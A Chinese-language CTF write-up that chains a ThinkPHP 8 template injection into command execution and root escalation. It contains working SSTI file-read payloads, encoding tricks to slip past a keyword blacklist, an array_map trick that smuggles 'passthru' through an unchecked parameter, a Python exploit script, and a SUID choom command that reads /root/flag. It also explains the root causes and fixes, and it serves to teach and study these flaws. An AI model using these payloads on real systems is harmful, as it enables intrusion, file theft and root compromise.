---
title: Renderme_wp
date: 2025-12-22 16:18:21
categories: upload
---

# RenderMe -

# ThinkPHP 8 SSTI 到 RCE 再 Privilege Escalation

## 题目信息

- **题目名称**: RenderMe
- **题目描述**: "I wrote a simple page to render your name."
- **难度**: 中等偏难
- **考点**: SSTI (服务端模板注入) → RCE (远程代码执行) → 权限提升

------

# Part 1: SSTI 漏洞分析与利用

## 一、什么是 SSTI 漏洞？

### 1.1 SSTI 概念

**SSTI (Server-Side Template Injection，服务端模板注入)** 是一种注入漏洞，发生在用户输入被不安全地嵌入到服务端模板中时。

现代 Web 应用通常使用模板引擎来动态生成 HTML 页面。模板引擎允许开发者在 HTML 中嵌入特殊语法，这些语法会在服务端被解析执行。

**正常的模板使用方式：**

```php
// 安全：变量通过参数传递，会被自动转义
$template = "Hello, {$name}";
View::display($template, ['name' => $userInput]);
```

**存在漏洞的使用方式：**

```php
// 危险：用户输入直接拼接到模板字符串中
$template = "Hello, " . $userInput;
View::display($template);
```

### 1.2 为什么 SSTI 危险？

当用户输入被直接拼接到模板中时，攻击者可以注入模板语法，让服务器执行任意代码：

```
正常输入: CTFer
模板渲染: Hello, CTFer

恶意输入: {$_SERVER.SERVER_SOFTWARE}
模板渲染: Hello, Apache/2.4.65 (Debian)  ← 服务器信息泄露！
```

### 1.3 不同模板引擎的 SSTI 语法

| 模板引擎   | 语言   | 测试 Payload                 | 预期输出   |
| ---------- | ------ | ---------------------------- | ---------- |
| Jinja2     | Python | `{{7*7}}`                    | `49`       |
| Twig       | PHP    | `{{7*7}}`                    | `49`       |
| Smarty     | PHP    | `{$smarty.version}`          | 版本号     |
| ThinkPHP   | PHP    | `{$_SERVER.SERVER_SOFTWARE}` | 服务器信息 |
| FreeMarker | Java   | `${7*7}`                     | `49`       |

------

## 二、信息收集与漏洞发现

### 2.1 初步探测

访问题目首页，看到提示：

```
Please tell me your name: /?name=CTFer
```

这是一个典型的用户输入渲染场景，立刻想到可能存在 SSTI 漏洞。

### 2.2 识别框架

通过响应头和错误信息，识别出：

- **Web 服务器**: Apache/2.4.65 (Debian)
- **PHP 版本**: PHP/8.4.15
- **框架**: ThinkPHP 8
- **模板引擎**: Think (ThinkTemplate)

### 2.3 SSTI 漏洞验证

尝试 ThinkPHP 模板语法：

```
/?name={$_SERVER.SERVER_SOFTWARE}
```

返回：

```
Hello, Apache/2.4.65 (Debian)
```

**确认存在 SSTI 漏洞！**

------

## 三、ThinkPHP 模板引擎深入分析

### 3.1 ThinkTemplate 语法

ThinkPHP 使用的 ThinkTemplate 模板引擎支持类似 Smarty 的语法：

**变量输出：**

```
{$name}              → 输出变量 $name
{$_SERVER.HTTP_HOST} → 输出 $_SERVER['HTTP_HOST']
{$_GET.param}        → 输出 $_GET['param']
```

**修饰符（关键特性）：**

```
{$var|函数名}        → 对变量应用函数
{$var|@函数名}       → 对变量应用函数（@ 表示变量作为第一个参数）
{$var|func1|func2}   → 链式调用多个函数
```

### 3.2 修饰符的工作原理

当模板引擎遇到 `{$var|@func}` 时，会将其编译为：

```php
<?php echo htmlentities((string) @func($var)); ?>
```

**这意味着我们可以通过修饰符调用任意 PHP 函数！**

### 3.3 文件读取 Payload 详解

```
/?name={$_GET.f|@file|@implode}&f=/etc/passwd
```

**逐步分解：**

1. `$_GET.f` → 获取 GET 参数 `f` 的值，即 `/etc/passwd`

2. `|@file` → 调用 `file('/etc/passwd')`，返回文件内容数组：

   ```php
   [
     "root:x:0:0:root:/root:/bin/bash\n",
     "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
     ...
   ]
   ```

3. `|@implode` → 调用 `implode($array)`，将数组合并为字符串：

   ```
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
   ```

**模板引擎编译后的 PHP 代码：**

```php
<?php echo htmlentities((string) @implode(@file($_GET['f']))); ?>
```

### 3.4 为什么要用两个参数？

**问题**：为什么不直接写 `{$_GET.f|@file}` 读取文件？

**原因**：`file()` 函数返回的是数组，直接输出会报错或显示 `Array`。需要用 `implode()` 将数组转换为字符串。

**为什么文件路径要通过 `$_GET.f` 传递？**

因为 WAF 过滤了 `flag`、`php` 等关键字。如果直接写：

```
{"/etc/passwd"|@file|@implode}  ← 需要引号，但引号被过滤！
```

通过 GET 参数传递路径，可以绕过对 `name` 参数的 WAF 检测。

------

## 四、源码分析与 WAF 绕过

### 4.1 读取控制器源码

```
/?name={$_GET.f|@file|@implode}&f=/var/www/html/app/controller/Index.php
```

获取到的源码：

```php
<?php
namespace app\controller;

use app\BaseController;
use think\facade\View;
use think\facade\Request;

class Index extends BaseController
{
    public function index()
    {
        $name = Request::param('name', '');

        if (empty($name)) {
            return "Please tell me your name: /?name=CTFer";
        }

        $blacklist = '/system|exec|passthru|shell_exec|popen|proc_open|include|pcntl|eval|assert|call_user_func|create_function|putenv|getenv|error_log|dl|mail|symlink|link|chroot|scandir|dir|glob|readfile|file_get_contents|highlight_file|show_source|fopen|flag|cat|php|\(|\)|\'|\"|`/i';

        if (preg_match($blacklist, $name)) {
            die("Hacker detected! WAF block: Your input contains illegal characters/functions.");
        }

        try {
            return View::display("Hello, " . $name);  // 漏洞点！
        } catch (\Throwable $e) {
            return "Template Error: Syntax invalid or execution failed.";
        }
    }
}
```

### 4.2 漏洞成因

```php
return View::display("Hello, " . $name);
```

用户输入 `$name` 被直接拼接到模板字符串中，没有经过转义处理，导致 SSTI 漏洞。

### 4.3 WAF 黑名单分析

```php
$blacklist = '/system|exec|passthru|shell_exec|popen|proc_open|include|pcntl|eval|assert|call_user_func|create_function|putenv|getenv|error_log|dl|mail|symlink|link|chroot|scandir|dir|glob|readfile|file_get_contents|highlight_file|show_source|fopen|flag|cat|php|\(|\)|\'|\"|`/i';
```

**被过滤的内容：**

| 类别         | 被过滤内容                                                   |
| ------------ | ------------------------------------------------------------ |
| 命令执行函数 | `system`, `exec`, `passthru`, `shell_exec`, `popen`, `proc_open` |
| 代码执行函数 | `eval`, `assert`, `call_user_func`, `create_function`        |
| 文件操作函数 | `include`, `readfile`, `file_get_contents`, `fopen`, `scandir`, `glob` |
| 关键字       | `flag`, `cat`, `php`                                         |
| **特殊字符** | `(`, `)`, `'`, `"`, `` ` ``                                  |

**核心难点**：括号 `()` 被过滤，无法直接调用函数！

### 4.4 绕过思路

虽然括号被过滤，但 ThinkPHP 模板引擎的修饰符语法 `{$var|@func}` **不需要括号**！

这是因为模板引擎内部会自动处理函数调用，我们只需要提供函数名。

------

## 五、任意文件读取利用

### 5.1 基础文件读取

```
/?name={$_GET.f|@file|@implode}&f=/etc/passwd
```

成功读取 `/etc/passwd` 文件内容。

### 5.2 绕过 `flag` 关键字过滤

WAF 过滤了 `flag` 关键字，使用 Base64 编码绕过：

```
/?name={$_GET.f|@base64_decode|@file|@implode}&f=L2ZsYWc=
```

**处理流程：**

1. `$_GET.f` = `L2ZsYWc=`
2. `|@base64_decode` → `/flag`
3. `|@file` → 读取文件
4. `|@implode` → 转换为字符串

### 5.3 其他编码绕过方式

**ROT13 编码：**

```
/?name={$_GET.f|@str_rot13|@file|@implode}&f=/synt
```

（`/synt` 是 `/flag` 的 ROT13 编码）

**字符串反转：**

```
/?name={$_GET.f|@strrev|@file|@implode}&f=galf/
```

（`galf/` 是 `/flag` 的反转）

### 5.4 文件读取的局限性

尝试读取常见的 flag 位置：

- `/flag` → 不存在
- `/flag.txt` → 不存在
- `/root/flag` → 权限不足
- `/var/www/html/flag` → 不存在

**文件读取无法直接获取 flag，需要进一步实现 RCE！**

------

# Part 2: 从 SSTI 到 RCE 再到提权

## 六、实现远程代码执行 (RCE)

### 6.1 RCE 的困境

虽然我们可以通过修饰符调用 PHP 函数，但：

1. 命令执行函数（`system`, `exec`, `passthru` 等）在 WAF 黑名单中
2. 括号 `()` 被过滤，无法直接调用函数

### 6.2 关键突破：array_map 绕过

**核心发现**：WAF 只检查 `name` 参数，不检查其他 GET 参数！

利用 `array_map` 函数，可以将函数名和参数分开传递：

```
/?name={$_GET.func|array_map=$_GET.cmd|implode}&func=passthru&cmd[]=id
```

### 6.3 Payload 详解

**`array_map` 函数签名：**

```php
array_map(callable $callback, array $array): array
```

**Payload 分解：**

```
{$_GET.func|array_map=$_GET.cmd|implode}
```

1. `$_GET.func` = `passthru`（从 URL 参数获取函数名）
2. `$_GET.cmd` = `["id"]`（从 URL 参数获取命令数组，`cmd[]=id` 形式）
3. `array_map=$_GET.cmd` → 模板引擎解析为 `array_map($callback, $array)`
4. `|implode` → 将结果数组转换为字符串

**模板引擎编译后的 PHP 代码：**

```php
<?php echo htmlentities((string) implode(array_map($_GET['func'], $_GET['cmd']))); ?>
```

**实际执行：**

```php
array_map('passthru', ['id']);
// 等价于对数组每个元素调用 passthru()
// passthru('id') → 执行系统命令 id
```

### 6.4 为什么能绕过 WAF？

1. `name` 参数中不包含 `passthru`、`system` 等关键字
2. `name` 参数中不包含括号 `()`
3. WAF 只检查 `name` 参数，不检查 `func` 和 `cmd` 参数
4. 危险的函数名通过 `func` 参数传递，绑定 WAF 检测

### 6.5 RCE 验证

```
/?name={$_GET.func|array_map=$_GET.cmd|implode}&func=passthru&cmd[]=id
```

返回：

```
Hello, uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**成功实现 RCE！**

### 6.6 Python 利用脚本

```python
import requests

URL = "http://web-05c67d8b43.challenge.xctf.org.cn/"

def rce(cmd):
    r = requests.get(URL, params={
        "name": "{$_GET.func|array_map=$_GET.cmd|implode}",
        "func": "passthru",
        "cmd[]": cmd
    })
    text = r.text
    if "Hello, " in text:
        text = text.split("Hello, ", 1)[1]
    return text.strip()

# 测试命令执行
print(rce("id"))
print(rce("ls -la /"))
print(rce("cat /etc/passwd"))
```

------

## 七、寻找 Flag

### 7.1 常规搜索

执行各种命令搜索 flag：

```bash
# 搜索 flag 文件
find / -name '*flag*' 2>/dev/null

# 搜索 flag 内容
grep -r 'flag{' / 2>/dev/null

# 检查环境变量
env | grep -i flag
```

**结果：常规位置都没有找到 flag！**

### 7.2 发现 /root 目录

```bash
ls -la /
```

输出显示 `/root` 目录存在，但权限为 `drwx------`（只有 root 可访问）：

```
drwx------   1 root root  18 Dec  9 09:41 root
```

尝试直接读取：

```bash
ls -la /root    # Permission denied
cat /root/flag  # Permission denied
```

**Flag 很可能在 /root 目录下，但当前用户 www-data 没有权限！**

------

## 八、权限提升

### 8.1 寻找提权向量

检查 SUID 文件：

```bash
find / -perm -4000 -type f 2>/dev/null
```

输出：

```
/usr/bin/chfn
/usr/bin/choom
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
```

**注意到 `/usr/bin/choom` 这个不常见的 SUID 程序！**

### 8.2 什么是 choom？

`choom` 是 Linux 的 OOM (Out of Memory) 调整工具，用于设置进程的 OOM 分数。

**关键特性：**

- 它是 SUID 程序（以 root 权限运行）
- 它可以执行其他命令（通过 `-n` 参数设置 OOM 分数后执行命令）

**choom 的用法：**

```bash
choom -n <oom_score_adj> -- <command>
```

### 8.3 choom 提权原理

当使用 `-n` 参数时，choom 会：

1. 以 root 权限运行（因为是 SUID 程序）
2. 设置 OOM 分数
3. **以 root 权限执行后面的命令**

这是一个已知的提权向量，可以在 [GTFOBins](https://gtfobins.github.io/gtfobins/choom/) 上找到。

### 8.4 获取 Flag

```bash
/usr/bin/choom -n 0 cat /root/flag
```

**成功读取 flag！**

### 8.5 为什么 choom 可以绕过权限？

1. `choom` 是 SUID 程序，执行时具有 root 权限
2. `-n 0` 设置 OOM 分数为 0（这个值不重要，只是为了触发命令执行）
3. 后面的 `cat /root/flag` 命令继承了 root 权限
4. 因此可以读取只有 root 才能访问的文件

------

## 九、漏洞成因总结

### 9.1 SSTI 漏洞

**漏洞代码：**

```php
return View::display("Hello, " . $name);
```

**问题**：用户输入直接拼接到模板字符串中，没有进行转义或过滤。

**正确做法**：

```php
return View::display("Hello, {$name}", ['name' => $name]);
```

### 9.2 WAF 绕过

**问题**：

- WAF 只检查 `name` 参数，不检查其他参数
- 使用黑名单过滤，容易被绕过
- 没有考虑到模板引擎的特殊语法

**正确做法**：

- 使用白名单验证
- 对所有用户输入进行检查
- 禁用危险的模板功能

### 9.3 SUID 提权

**问题**：

- `choom` 被设置为 SUID，可以以 root 权限执行任意命令
- 这是一个已知的提权向量

**正确做法**：

- 最小权限原则
- 定期审计 SUID 文件
- 使用 capabilities 替代 SUID

------

## 十、完整攻击链

```
┌─────────────────────────────────────────────────────────────┐
│                      攻击流程图                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 发现 SSTI 漏洞                                          │
│     /?name={$_SERVER.SERVER_SOFTWARE}                       │
│                    ↓                                        │
│  2. 利用 SSTI 读取源码，分析 WAF                             │
│     /?name={$_GET.f|@file|@implode}&f=/var/www/.../Index.php│
│                    ↓                                        │
│  3. 利用 array_map 绕过 WAF 实现 RCE                         │
│     /?name={$_GET.func|array_map=$_GET.cmd|implode}         │
│     &func=passthru&cmd[]=id                                 │
│                    ↓                                        │
│  4. 发现 flag 在 /root 目录，权限不足                        │
│     ls -la /root → Permission denied                        │
│                    ↓                                        │
│  5. 发现 SUID 程序 choom                                     │
│     find / -perm -4000 -type f                              │
│                    ↓                                        │
│  6. 利用 choom 提权读取 flag                                 │
│     /usr/bin/choom -n 0 cat /root/flag                      │
│                    ↓                                        │
│  7. 获取 Flag！                                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

------

## 十一、最终 Payload

```python
import requests

URL = "http://web-05c67d8b43.challenge.xctf.org.cn/"

def rce(cmd):
    r = requests.get(URL, params={
        "name": "{$_GET.func|array_map=$_GET.cmd|implode}",
        "func": "passthru",
        "cmd[]": cmd
    })
    text = r.text
    if "Hello, " in text:
        text = text.split("Hello, ", 1)[1]
    return text.strip()

# 获取 flag
flag = rce("/usr/bin/choom -n 0 cat /root/flag")
print(f"Flag: {flag}")
```

------

## 十二、知识点总结

1. **SSTI 漏洞原理**
   - 用户输入被直接拼接到模板中导致代码执行
   - 不同模板引擎有不同的语法和利用方式
   - ThinkPHP 使用 `{$var}` 语法
2. **ThinkPHP 模板引擎特性**
   - 支持 Smarty 风格的修饰符语法 `{$var|@func}`
   - 可以链式调用多个函数
   - 修饰符语法不需要括号
3. **WAF 绕过技巧**
   - 利用参数分离绕过检测
   - 使用 Base64/ROT13 编码绕过关键字过滤
   - 利用框架特性绕过括号过滤
4. **Linux 提权**
   - SUID 文件是常见的提权向量
   - `choom` 是一个较少被关注的 SUID 提权工具
   - 使用 `find / -perm -4000` 查找 SUID 文件
5. **安全建议**
   - 永远不要将用户输入直接拼接到模板中
   - 使用白名单而非黑名单进行过滤
   - 定期审计系统中的 SUID 文件
   - 遵循最小权限原则

------

## 参考资料

- [ThinkPHP 8 官方文档](https://doc.thinkphp.cn)
- [SSTI (Server-Side Template Injection)](https://portswigger.net/web-security/server-side-template-injection)
- [Linux SUID 提权 - GTFOBins](https://gtfobins.github.io/)
- [choom 手册页](https://man7.org/linux/man-pages/man1/choom.1.html)

------

*Writeup 作者：Fan*
*完成时间：2025-12-21*